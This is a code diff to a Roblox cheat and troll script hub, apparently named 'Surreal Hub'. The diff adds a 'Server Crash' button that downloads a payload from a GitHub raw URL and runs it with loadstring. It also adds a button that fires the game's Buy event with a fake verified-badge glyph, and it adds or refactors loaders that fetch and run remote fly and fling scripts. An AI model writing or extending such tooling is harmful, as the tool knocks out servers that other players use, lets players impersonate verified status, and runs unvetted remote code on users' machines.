@@ -223,7 +223,6 @@ local State = {
     nameplateCharConns  = {},
 
     waterWalkEnabled = false,
-    flyEnabled = false,
     followEnabled = false,
 }
 
@@ -547,101 +546,27 @@ Main:CreateButton({
 })
 
 --==================================================
--- MAIN — FLY V3
+-- MAIN — FLY V3 (Universal Fly Gui V3)
 --==================================================
 Main:CreateSection("Fly")
 
-local flyBV, flyBG, flyRenderConn
-local flyKeys = { W = false, A = false, S = false, D = false, Space = false, Ctrl = false }
-local flySpeed = 50
-local flyConnections = {}
-
-local function stopFly()
-    if flyBV then flyBV:Destroy(); flyBV = nil end
-    if flyBG then flyBG:Destroy(); flyBG = nil end
-    if flyRenderConn then flyRenderConn:Disconnect(); flyRenderConn = nil end
-    for _, c in ipairs(flyConnections) do c:Disconnect() end
-    flyConnections = {}
-    local hum = Utilities.humanoid()
-    if hum then hum.PlatformStand = false end
-    State.flyEnabled = false
-end
-
-local function startFly()
-    local root = Utilities.rootPart()
-    if not root then return false end
-
-    root.CustomPhysicalProperties = PhysicalProperties.new(0.01, 0.01, 0.01, 0, 0)
-
-    flyBV = Instance.new("BodyVelocity")
-    flyBV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
-    flyBV.Velocity = Vector3.zero
-    flyBV.Parent = root
-
-    flyBG = Instance.new("BodyGyro")
-    flyBG.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
-    flyBG.P = 9e4
-    flyBG.D = 100
-    flyBG.Parent = root
-
-    local hum = Utilities.humanoid()
-    if hum then hum.PlatformStand = true end
-
-    local function bind(key, slot)
-        table.insert(flyConnections, UserInputService.InputBegan:Connect(function(i)
-            if i.KeyCode == key then flyKeys[slot] = true end
-        end))
-        table.insert(flyConnections, UserInputService.InputEnded:Connect(function(i)
-            if i.KeyCode == key then flyKeys[slot] = false end
-        end))
-    end
-    bind(Enum.KeyCode.W, "W")
-    bind(Enum.KeyCode.A, "A")
-    bind(Enum.KeyCode.S, "S")
-    bind(Enum.KeyCode.D, "D")
-    bind(Enum.KeyCode.Space, "Space")
-    bind(Enum.KeyCode.LeftControl, "Ctrl")
-
-    flyRenderConn = RunService.RenderStepped:Connect(function()
-        local r = Utilities.rootPart()
-        if not r or not flyBV or not flyBG then return end
-        local cam = workspace.CurrentCamera
-        local move = Vector3.zero
-        if flyKeys.W then move = move + cam.CFrame.LookVector end
-        if flyKeys.S then move = move - cam.CFrame.LookVector end
-        if flyKeys.A then move = move - cam.CFrame.RightVector end
-        if flyKeys.D then move = move + cam.CFrame.RightVector end
-        if flyKeys.Space then move = move + Vector3.new(0, 1, 0) end
-        if flyKeys.Ctrl then move = move - Vector3.new(0, 1, 0) end
-        flyBV.Velocity = (move.Magnitude > 0) and (move.Unit * flySpeed) or Vector3.zero
-        flyBG.CFrame = cam.CFrame
-    end)
-
-    State.flyEnabled = true
-    return true
-end
-
-Main:CreateSlider({
-    Name = "Fly Speed",
-    Description = "how fast you fly",
-    Range = {50, 150},
-    Increment = 5,
-    CurrentValue = 50,
-    Callback = Utilities.safe(function(value) flySpeed = value end),
-}, "FlySpeed")
-
-Main:CreateToggle({
-    Name = "Fly V3",
-    Description = "WASD to move · Space up · Ctrl down",
-    CurrentValue = false,
-    Callback = Utilities.safe(function(enabled)
-        if enabled then
-            if not startFly() then Utilities.notify("Fly V3", "No character", 4) end
-        else
-            stopFly()
-        end
+Main:CreateButton({
+    Name = "Universal Fly Gui V3",
+    Description = "loads the Universal Fly Gui V3 script",
+    Callback = Utilities.safe(function()
+        task.spawn(function()
+            local ok, err = pcall(function()
+                loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universal-Fly-Gui-V3-15837"))()
+            end)
+            if ok then
+                Utilities.notify("Fly V3", "Fly Gui loaded successfully.", 4)
+            else
+                Utilities.notify("Fly V3 Error", tostring(err), 4)
+                warn("[Surreal Hub][Fly V3] " .. tostring(err))
+            end
+        end)
     end),
-}, "FlyV3")
+})
 
 --==================================================
 -- MAIN — GLOBAL NAMEPLATES
@@ -1122,14 +1047,6 @@ Challenges:CreateButton({
 Morphs:CreateSection("Paid")
 
 local characterNameBuffer = ""
-local selectedSymbol = ""
-
-local SYMBOL_MAP = {
-    ["None"]     = "",
-    ["Verified"] = "\u{e000}",
-    ["Premium"]  = "\u{e001}",
-    ["Robux"]    = "\u{e002}",
-}
 
 Morphs:CreateInput({
     Name = "Character Name",
@@ -1153,28 +1070,39 @@ Morphs:CreateButton({
     end),
 })
 
-Morphs:CreateDropdown({
-    Name = "Select Symbol",
-    Description = "pick an ugly symbols",
-    Options = {"None", "Verified", "Premium", "Robux"},
-    CurrentOption = {"None"},
-    MultipleOptions = false,
-    Callback = Utilities.safe(function(value)
-        local choice = type(value) == "table" and (value[1] or value.Option) or value
-        selectedSymbol = SYMBOL_MAP[choice] or ""
+Morphs:CreateButton({
+    Name = "Get Verified Symbol (@60)",
+    Description = "applies the verified badge to your character name",
+    Callback = Utilities.safe(function()
+        if characterNameBuffer == "" then return end
+        local VERIFIED = "\u{e000}"
+        local final = characterNameBuffer .. " " .. VERIFIED
+        local events = RS:FindFirstChild("Events")
+        local buy = events and events:FindFirstChild("Buy")
+        if buy then buy:FireServer("Character", final) end
     end),
 })
 
 Morphs:CreateButton({
-    Name = "Buy Symbol (@60)",
-    Description = "applies it to your name",
+    Name = "Server Crash",
+    Description = "valid crashout hun",
     Callback = Utilities.safe(function()
-        if characterNameBuffer == "" then return end
-        local final = characterNameBuffer
-        if selectedSymbol ~= "" then final = characterNameBuffer .. " " .. selectedSymbol end
-        local events = RS:FindFirstChild("Events")
-        local buy = events and events:FindFirstChild("Buy")
-        if buy then buy:FireServer("Character", final) end
+        task.spawn(function()
+            local url = "https://raw.githubusercontent.com/surrre4l/bruh/main/surrealcrash.lua"
+            local ok, err = pcall(function()
+                local src = game:HttpGet(url, true)
+                if not src or #src < 50 then error("Empty or invalid response") end
+                local fn = loadstring(src)
+                if not fn then error("loadstring returned nil") end
+                fn()
+            end)
+            if ok then
+                Utilities.notify("Server Crash", "Payload executed.", 4)
+            else
+                Utilities.notify("Server Crash Error", tostring(err), 4)
+                warn("[Surreal Hub][Server Crash] " .. tostring(err))
+            end
+        end)
     end),
 })
 
@@ -1521,10 +1449,24 @@ end)
 TrollTab:CreateSection("Scripts")
 
 TrollTab:CreateButton({
-    Name = "Fling",
+    Name = "Flinger",
+    Description = "loads the Flinger script from GitHub",
     Callback = function()
         task.spawn(function()
-            pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/surrre4l/bruh/main/exe.lua.txt"))() end)
+            local url = "https://raw.githubusercontent.com/surrre4l/bruh/main/exe.lua.txt"
+            local ok, err = pcall(function()
+                local src = game:HttpGet(url, true)
+                if not src or #src < 50 then error("Empty or invalid response") end
+                local fn = loadstring(src)
+                if not fn then error("loadstring returned nil") end
+                fn()
+            end)
+            if ok then
+                Utilities.notify("Flinger Loaded", "Flinger is now active.", 4)
+            else
+                Utilities.notify("Flinger Error", tostring(err), 4)
+                warn("[Surreal Hub][Flinger] " .. tostring(err))
+            end
         end)
     end,
 })
@@ -1599,29 +1541,6 @@ TrollTab:CreateButton({
                     "https://rawscripts.net/raw/Universal-Script-Freaky-gui-supported-r6-r15-29701"
                 ))()
             end)
-        end)
-    end,
-})
-
-TrollTab:CreateButton({
-    Name = "Flinger",
-    Description = "loads the Flinger script from GitHub",
-    Callback = function()
-        task.spawn(function()
-            local url = "https://raw.githubusercontent.com/surrre4l/bruh/main/exe.lua.txt"
-            local ok, err = pcall(function()
-                local src = game:HttpGet(url, true)
-                if not src or #src < 50 then error("Empty or invalid response") end
-                local fn = loadstring(src)
-                if not fn then error("loadstring returned nil") end
-                fn()
-            end)
-            if ok then
-                Utilities.notify("Flinger Loaded", "Flinger is now active.", 4)
-            else
-                Utilities.notify("Flinger Error", tostring(err), 4)
-                warn("[Surreal Hub][Flinger] " .. tostring(err))
-            end
         end)
     end,
 })
@@ -1735,7 +1654,6 @@ task.spawn(function()
         Luna:LoadAutoloadConfig()
     end)
 
-    -- Give the UI a moment to render before notifying
     task.wait(1.5)
 
     pcall(function()
@@ -1743,7 +1661,7 @@ task.spawn(function()
             Title    = "Surreal Hub Loaded",
             Content  = "inputs may not work, tested and I can't click it so. Try if u can!",
             Duration = 6,
-            Image    = "triangle-alert",
+            Image    = "bell-ring",
         })
     end)
 
